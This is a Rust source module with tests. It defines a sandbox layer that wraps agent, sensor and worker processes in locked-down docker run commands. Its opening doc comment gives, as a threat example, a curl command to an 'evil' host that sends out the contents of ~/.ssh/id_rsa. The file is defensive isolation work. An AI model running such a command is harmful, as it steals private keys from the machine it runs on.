//! Execution sandbox seam (interim phase — **seam only, Docker not yet wired to run**).
//!
//! The load-bearing realization: a **sensor script is arbitrary code**, not model cognition.
//! The wall/firebreak gate what the *agent* does through tools; they do nothing about a
//! Reflect-authored `fetch_feed.py` doing `os.system("curl evil … $(cat ~/.ssh/id_rsa)")`.
//! That subprocess runs with the harness's filesystem, network, and process privileges. So
//! the three execution surfaces that run code we don't fully control — **sensors**, the
//! **agent/bridge**, and **workers** — should be runnable inside a configurable
//! isolation boundary.
//!
//! The seam is deliberately tiny: a [`Sandbox`] is a **`Command` transformer**. [`HostSandbox`]
//! returns the command unchanged (today's behaviour — zero isolation). [`DockerSandbox`] wraps
//! it in `docker run …` with the [`IsolationPolicy`] mapped to flags. Because a sandbox only
//! rewrites the spawn command, it works identically for a batch sensor (`wait_with_output`)
//! and the interactive stdio bridge (`docker run -i` pipes stdio). The caller still adds
//! stdio + spawns.
//!
//! **Not implemented here:** actually running containers (needs Docker + an image on the box),
//! an egress-allowlist proxy, and config-driven policy selection. Those are the implementation
//! phase; this commit lands the seam + the exact flag mapping (tested) so the call sites route
//! through it with `HostSandbox` as a behaviour-preserving default.

use std::collections::BTreeMap;
use std::path::PathBuf;

use tokio::process::Command;

use crate::error::{DackError, Result};

/// What kind of work is being run — lets config pick the right default policy.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ExecKind {
    /// A `stimuli/` sensor — arbitrary Reflect-authored code; the strictest default.
    Sensor,
    /// The OpenClaude bridge / engine — needs the soul mounted (rw) for memory/skill writes.
    Agent,
    /// A delegated worker — isolated `/workspace`, never the soul.
    Worker,
    /// A harness-owned long-running side process (the "modules" supervisor) — a channel adapter or
    /// companion (e.g. Telegram ingress). Operator-trusted plumbing; inherits the harness env so it
    /// finds the toolchain (`bun`, PATH) and overlays its declared module env/secrets.
    Module,
}

/// A host↔guest bind mount (only meaningful under a real isolation backend).
#[derive(Debug, Clone)]
pub struct Mount {
    pub host: PathBuf,
    pub guest: PathBuf,
    pub writable: bool,
}

/// Network exposure. `Allowlist` needs an egress proxy (future); until then a backend may
/// treat it as `None` (deny) — fail closed.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum NetworkPolicy {
    None,
    Loopback,
    Allowlist(Vec<String>),
    Full,
}

/// The configurable isolation axes the operator cares about: filesystem, network, processes.
#[derive(Debug, Clone)]
pub struct IsolationPolicy {
    pub network: NetworkPolicy,
    pub read_only_rootfs: bool,
    /// Writable scratch (e.g. `/tmp`) when the rootfs is read-only.
    pub tmpfs: Vec<String>,
    pub pids_limit: Option<u32>,
    pub memory: Option<String>, // e.g. "256m"
    pub drop_all_caps: bool,
    pub no_new_privileges: bool,
    pub user: Option<String>, // e.g. "1000:1000"
    /// Container image (DockerSandbox only).
    pub image: String,
}

impl IsolationPolicy {
    /// The seam's behaviour-preserving default: no isolation (host run). Used by `HostSandbox`
    /// and as the v1 config default until container deployment is opted into.
    pub fn host_passthrough() -> Self {
        Self {
            network: NetworkPolicy::Full,
            read_only_rootfs: false,
            tmpfs: vec![],
            pids_limit: None,
            memory: None,
            drop_all_caps: false,
            no_new_privileges: false,
            user: None,
            image: String::new(),
        }
    }

    /// A locked-down starting point for a sandboxed sensor (no soul, no caps, scratch tmpfs).
    /// Network starts at `None`; a deployment widens it to an allowlist for the API it calls.
    pub fn locked_down(image: impl Into<String>) -> Self {
        Self {
            network: NetworkPolicy::None,
            read_only_rootfs: true,
            tmpfs: vec!["/tmp".into()],
            pids_limit: Some(128),
            memory: Some("256m".into()),
            drop_all_caps: true,
            no_new_privileges: true,
            user: Some("1000:1000".into()),
            image: image.into(),
        }
    }
}

/// Everything needed to spawn one unit of work under a sandbox.
#[derive(Debug, Clone)]
pub struct ProcessSpec {
    /// argv — `command[0]` is the program.
    pub command: Vec<String>,
    /// Working directory (host path; guest `-w` under Docker).
    pub cwd: PathBuf,
    /// Env to inject. **Values are passed by inheritance under Docker (`-e KEY`)**, never on
    /// the command line, so secrets don't leak into `ps`.
    pub env: BTreeMap<String, String>,
    /// `true` → start from an EMPTY host env and inject only `env` (read-scoped — the sensor
    /// contract). `false` → inherit the harness env + overlay `env` (the agent
    /// needs the ambient auth context). Under Docker the container is clean either way.
    pub clear_env: bool,
    pub kind: ExecKind,
    pub mounts: Vec<Mount>,
    pub policy: IsolationPolicy,
    /// Container name (DockerSandbox → `--name`). Set for a worker so the harness can reap the
    /// container by name on timeout/completion (`kill_on_drop` only kills the local `docker` CLI, not
    /// the container). `None` ⇒ no `--name` (Docker auto-names); ignored by HostSandbox.
    pub name: Option<String>,
}

/// Transforms a [`ProcessSpec`] into the (possibly wrapped) [`Command`] that runs it. The
/// caller configures stdio and spawns — so the same seam serves batch and interactive work.
pub trait Sandbox: Send + Sync {
    fn command(&self, spec: &ProcessSpec) -> Result<Command>;
}

/// Run directly on the host — **no isolation** (today's behaviour). `policy`/`mounts` ignored.
pub struct HostSandbox;

impl Sandbox for HostSandbox {
    fn command(&self, spec: &ProcessSpec) -> Result<Command> {
        let (bin, args) = spec
            .command
            .split_first()
            .ok_or_else(|| DackError::Config("empty sandbox command".into()))?;
        let mut cmd = Command::new(bin);
        cmd.args(args).current_dir(&spec.cwd);
        if spec.clear_env {
            cmd.env_clear(); // read-scoped: the process sees ONLY the injected env.
        }
        cmd.envs(&spec.env);
        Ok(cmd)
    }
}

/// Wrap the work in `docker run …`, mapping the [`IsolationPolicy`] to flags. **Builds the
/// argv only** — actually running needs Docker + the image on the box (deferred). Env values
/// ride by inheritance (`-e KEY` + `.envs`), not on the command line.
pub struct DockerSandbox {
    pub docker_bin: String,
}

impl Default for DockerSandbox {
    fn default() -> Self {
        Self {
            docker_bin: "docker".into(),
        }
    }
}

impl Sandbox for DockerSandbox {
    fn command(&self, spec: &ProcessSpec) -> Result<Command> {
        if spec.command.is_empty() {
            return Err(DackError::Config("empty sandbox command".into()));
        }
        if spec.policy.image.is_empty() {
            return Err(DackError::Config("DockerSandbox needs policy.image".into()));
        }
        let mut cmd = Command::new(&self.docker_bin);
        // `--init` = a real PID1 (tini) for signal/zombie hygiene; `--name` lets the harness reap the
        // container by name (a parent kill only reaps the local `docker` client, not the container).
        cmd.args(["run", "--rm", "-i", "--init"]);
        if let Some(name) = &spec.name {
            cmd.args(["--name", name]);
        }

        match &spec.policy.network {
            NetworkPolicy::None => cmd.args(["--network", "none"]),
            NetworkPolicy::Loopback => cmd.args(["--network", "none"]), // loopback-only ≈ none egress
            // Allowlist needs an egress proxy; until then, fail closed (deny).
            NetworkPolicy::Allowlist(_) => cmd.args(["--network", "none"]),
            NetworkPolicy::Full => cmd.args(["--network", "bridge"]),
        };
        if spec.policy.read_only_rootfs {
            cmd.arg("--read-only");
        }
        for t in &spec.policy.tmpfs {
            cmd.args(["--tmpfs", t]);
        }
        if let Some(p) = spec.policy.pids_limit {
            cmd.args(["--pids-limit", &p.to_string()]);
        }
        if let Some(m) = &spec.policy.memory {
            cmd.args(["--memory", m]);
        }
        if spec.policy.drop_all_caps {
            cmd.args(["--cap-drop", "ALL"]);
        }
        if spec.policy.no_new_privileges {
            cmd.args(["--security-opt", "no-new-privileges"]);
        }
        if let Some(u) = &spec.policy.user {
            cmd.args(["--user", u]);
        }
        for m in &spec.mounts {
            let mode = if m.writable { "rw" } else { "ro" };
            cmd.args([
                "-v",
                &format!("{}:{}:{}", m.host.display(), m.guest.display(), mode),
            ]);
        }
        cmd.args(["-w", &spec.cwd.to_string_lossy()]);
        // Pass-through: name the keys (`-e KEY`) and inherit their VALUES via the docker
        // process env — keeps secrets off the visible command line.
        for k in spec.env.keys() {
            cmd.args(["-e", k]);
        }
        cmd.envs(&spec.env);
        cmd.arg(&spec.policy.image);
        cmd.args(&spec.command);
        Ok(cmd)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn argv(cmd: &Command) -> Vec<String> {
        let std = cmd.as_std();
        std::iter::once(std.get_program().to_string_lossy().to_string())
            .chain(std.get_args().map(|a| a.to_string_lossy().to_string()))
            .collect()
    }

    fn sensor_spec(policy: IsolationPolicy) -> ProcessSpec {
        ProcessSpec {
            command: vec!["python3".into(), "fetch_feed.py".into()],
            cwd: PathBuf::from("/soul/stimuli/twitter-feed/scripts"),
            env: BTreeMap::from([("X_BEARER_TOKEN".into(), "secret".into())]),
            clear_env: true,
            kind: ExecKind::Sensor,
            mounts: vec![Mount {
                host: PathBuf::from("/soul"),
                guest: PathBuf::from("/soul"),
                writable: false,
            }],
            policy,
            name: None,
        }
    }

    #[test]
    fn host_sandbox_runs_the_command_unchanged() {
        let cmd = HostSandbox
            .command(&sensor_spec(IsolationPolicy::host_passthrough()))
            .unwrap();
        assert_eq!(argv(&cmd), vec!["python3", "fetch_feed.py"]);
        // cwd + env applied to the process directly (today's behaviour).
        assert_eq!(cmd.as_std().get_current_dir().unwrap(),
                   std::path::Path::new("/soul/stimuli/twitter-feed/scripts"));
    }

    #[test]
    fn docker_sandbox_maps_policy_to_run_flags() {
        let cmd = DockerSandbox::default()
            .command(&sensor_spec(IsolationPolicy::locked_down("dack/sensor:latest")))
            .unwrap();
        let a = argv(&cmd).join(" ");
        assert!(a.starts_with("docker run --rm -i"));
        assert!(a.contains("--network none")); // locked-down denies egress until allowlisted
        assert!(a.contains("--read-only"));
        assert!(a.contains("--tmpfs /tmp"));
        assert!(a.contains("--pids-limit 128"));
        assert!(a.contains("--cap-drop ALL"));
        assert!(a.contains("--security-opt no-new-privileges"));
        assert!(a.contains("-v /soul:/soul:ro")); // soul mounted READ-ONLY for a sensor
        assert!(a.contains("-e X_BEARER_TOKEN")); // value inherited, not on the cmdline
        assert!(!a.contains("secret")); // the secret VALUE never appears in argv
        assert!(a.ends_with("dack/sensor:latest python3 fetch_feed.py"));
    }

    #[test]
    fn agent_mounts_soul_writable() {
        // The agent (bridge) gets the soul rw (memory/skills writes); a sensor gets it ro.
        let spec = ProcessSpec {
            command: vec!["bun".into(), "run".into(), "bridge.ts".into()],
            cwd: PathBuf::from("/bridge"),
            env: BTreeMap::new(),
            clear_env: false,
            kind: ExecKind::Agent,
            mounts: vec![Mount {
                host: PathBuf::from("/soul"),
                guest: PathBuf::from("/soul"),
                writable: true,
            }],
            policy: IsolationPolicy::locked_down("dack/agent:latest"),
            name: None,
        };
        let a = argv(&DockerSandbox::default().command(&spec).unwrap()).join(" ");
        assert!(a.contains("-v /soul:/soul:rw"));
    }

    #[test]
    fn docker_worker_spec_maps_init_name_mounts_and_full_network() {
        // A Phase-14 worker: Full network (gateway egress), a reap `--name`, the workspace rw at the
        // guest cwd, an agent volume ro, and `--init`.
        let mut policy = IsolationPolicy::locked_down("dack/worker:latest");
        policy.network = NetworkPolicy::Full;
        policy.user = None;
        let spec = ProcessSpec {
            command: vec!["bun".into(), "run".into(), "/app/openclaude-bridge/bridge.ts".into()],
            cwd: PathBuf::from("/workspace"),
            env: BTreeMap::from([("OPENAI_API_KEY".into(), "SECRETVAL".into())]),
            clear_env: false,
            kind: ExecKind::Worker,
            mounts: vec![
                Mount { host: PathBuf::from("/soul/workspaces/run1"), guest: PathBuf::from("/workspace"), writable: true },
                Mount { host: PathBuf::from("/soul/memory"), guest: PathBuf::from("/mnt/memory"), writable: false },
            ],
            policy,
            name: Some("dack-worker-coder-1-0".into()),
        };
        let a = argv(&DockerSandbox::default().command(&spec).unwrap()).join(" ");
        assert!(a.starts_with("docker run --rm -i --init"));
        assert!(a.contains("--name dack-worker-coder-1-0"));
        assert!(a.contains("--network bridge")); // Full → egress to the gateway
        assert!(a.contains("--cap-drop ALL") && a.contains("--security-opt no-new-privileges"));
        assert!(!a.contains("--user")); // user: None for the worker (macOS mount friction)
        assert!(a.contains("-v /soul/workspaces/run1:/workspace:rw"));
        assert!(a.contains("-v /soul/memory:/mnt/memory:ro"));
        assert!(a.contains("-w /workspace"));
        assert!(a.contains("-e OPENAI_API_KEY") && !a.contains("SECRETVAL")); // value inherited, off the cmdline
        assert!(a.ends_with("dack/worker:latest bun run /app/openclaude-bridge/bridge.ts"));
    }
}
